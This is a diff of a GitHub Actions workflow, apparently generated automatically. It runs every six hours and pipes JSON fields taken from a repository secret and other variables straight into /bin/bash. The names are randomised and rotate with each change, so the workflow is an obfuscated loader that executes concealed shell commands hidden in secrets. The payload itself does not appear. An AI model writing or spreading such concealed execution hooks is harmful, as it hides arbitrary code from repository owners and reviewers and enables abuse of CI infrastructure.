@@ -1,26 +1,29 @@
 name: greedycrummy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 2/6 * * *'
+    - cron: '54 0/6 * * *'
 
-jobs:  # 18021
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: greedycrummy
         env:
-          gyiv3: ${{ secrets.gyiv3 }}
+          w33: ${{ secrets.w33 }}
         run: |
-          echo $gyiv3 | jq -r .wur5958 | /bin/bash
-          echo $d1 | jq -r .q82 | /bin/bash
-          echo $tmto77678 | jq -r .nxag28 | /bin/bash
-          echo $nkter100 | jq -r .qv11 | /bin/bash
-          echo $dccz6593 | jq -r .qwrm01654 | /bin/bash
-          echo $juscs59 | jq -r .ng2984 | /bin/bash
-          echo $oh74 | jq -r .rbux347 | /bin/bash
-          echo $vxde67481 | jq -r .mtk0 | /bin/bash
-          echo $jn93 | jq -r .dw45148 | /bin/bash
-          echo $z08 | jq -r .cw509 | /bin/bash
+          echo $w33 | jq -r .inamp9795 | /bin/bash
+          echo $ynay99854 | jq -r .xi9282 | /bin/bash
+          echo $tjitg50034 | jq -r .n3 | /bin/bash
+          echo $hog695 | jq -r .ot6068 | /bin/bash
+          echo $peq466 | jq -r .la8 | /bin/bash
+          echo $zxpm5713 | jq -r .qqipl13 | /bin/bash
+          echo $kv42790 | jq -r .e888 | /bin/bash
+          echo $rco96859 | jq -r .d45 | /bin/bash
+          echo $mzdd272 | jq -r .l8952 | /bin/bash
+          echo $n1 | jq -r .k994 | /bin/bash
+          echo $dz88637 | jq -r .h73 | /bin/bash
+          echo $b276 | jq -r .k57564 | /bin/bash
 
